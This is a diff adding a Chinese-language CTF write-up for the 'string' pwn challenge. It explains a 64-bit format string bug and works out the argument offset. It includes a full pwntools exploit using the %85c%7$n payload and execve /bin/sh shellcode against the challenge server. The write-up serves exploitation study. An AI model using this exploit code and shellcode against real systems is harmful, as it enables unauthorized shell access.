@@ -34,3 +34,85 @@
 题目：菜鸡认为自己需要一个字符串
 
 思路：简单的栈溢出，首先利用一个固定地址的全局变量保存/bin/sh字符串，然后利用ROP获得shell
+
+### string
+题目：菜鸡遇到了Dragon，有一位巫师可以帮助他逃离危险，但似乎需要一些要求
+
+思路：简单的64位格式化字符串漏洞，先利用改漏洞修改一个堆上的变量，然后写入shellcode即可
+
+解题：函数sub_400BB9存在格式化字符串漏洞，直接使用printf输出了format变量，这里首先确定可控制字符串format的偏移。有两种方法。
+
+#### 偏移计算一：通过逆向和调试确定分析调用printf之前栈的分布
+
+栈顶8个字节（没什么作用），往下8个字节的v2变量，再往下是format字符串。
+```
+rsp    --> 8字节垃圾
+rsp+8  --> 8字节变量v2
+rsp+16 --> format字符串
+```
+
+由于64位传参时，前6个参数使用寄存器，这里第一个参数是rdi，也就是format地址本身，后面5几个寄存器依次保存5个参数，栈顶8个字节是第6个参数，v2是第第7个参数，format是8个参数，因此偏移为8。
+
+#### 偏移计算二：使用pwntools工具包自动计算
+```python
+context.bits = 64
+
+def leak(payload):
+    sh = remote('220.249.52.133', 59913)
+    sh.recvuntil('be:\n')
+    sh.sendline('1')
+    sh.recvuntil('up?:\n')
+    sh.sendline('east')
+    sh.recvuntil('?:\n')
+    sh.sendline('1')
+    sh.recvuntil("'\n")
+    sh.sendline('1')
+    sh.recvuntil(':\n')
+    sh.sendline(payload)
+    info = sh.recvuntil('I hear')
+    sh.close()
+    return info
+
+autofmt = FmtStr(leak)
+print(autofmt.offset)
+```
+
+下面分析需求修改的变量，通过逆向分析，程序初始化了两个变量，一个为字符D，一个为字符U，如果这两个变量相等可以进入输入shellcode的逻辑，正常情况是不可能的，这里就利用字符串格式化漏洞实现。首先输入v2变量，内容为secret[0]的地址，然后format输入以下内容 %85c%7$n ,将第7个参数（v2）指向的内容写入85，也就是字符U。
+
+后续输入shellcode可以使用pwntools，我这里是通过msf生成的。全部代码如下：
+```python
+def execute():
+    sh = remote('220.249.52.133', 59913)
+    info = sh.recvuntil('be:\n')
+    info = str(info, encoding='utf8')
+    addr = ''
+    for line in info.split('\n'):
+        if '[0]' in line:
+            # 保存待修改变量地址
+            addr = line.split(' ')[-1].strip()
+            break
+    print('secret addr:')
+    print(addr)
+    addr = int(addr, 16)
+
+    sh.sendline('1')
+    sh.recvuntil('up?:\n')
+    sh.sendline('east')
+    sh.recvuntil('?:\n')
+    sh.sendline('1')
+    sh.recvuntil("'\n")
+    # 将待修改变量地址写入v2
+    sh.sendline(str(addr).encode('utf8'))
+    sh.recvuntil(':\n')
+    
+    # 利用这段payload修改变量
+    payload = r'%85c%7$n'
+    print(payload)
+    sh.sendline(payload)
+    print(sh.recvuntil('USE YOU SPELL'))
+
+    # 写入shellcode
+    shellcode = "\x6a\x3b\x58\x99\x48\xbb\x2f\x62\x69\x6e\x2f\x73\x68\x00" + "\x53\x48\x89\xe7\x68\x2d\x63\x00\x00\x48\x89\xe6\x52\xe8" + "\x08\x00\x00\x00\x2f\x62\x69\x6e\x2f\x73\x68\x00\x56\x57" + "\x48\x89\xe6\x0f\x05"
+    sh.sendline(shellcode)
+    sh.interactive()
+````
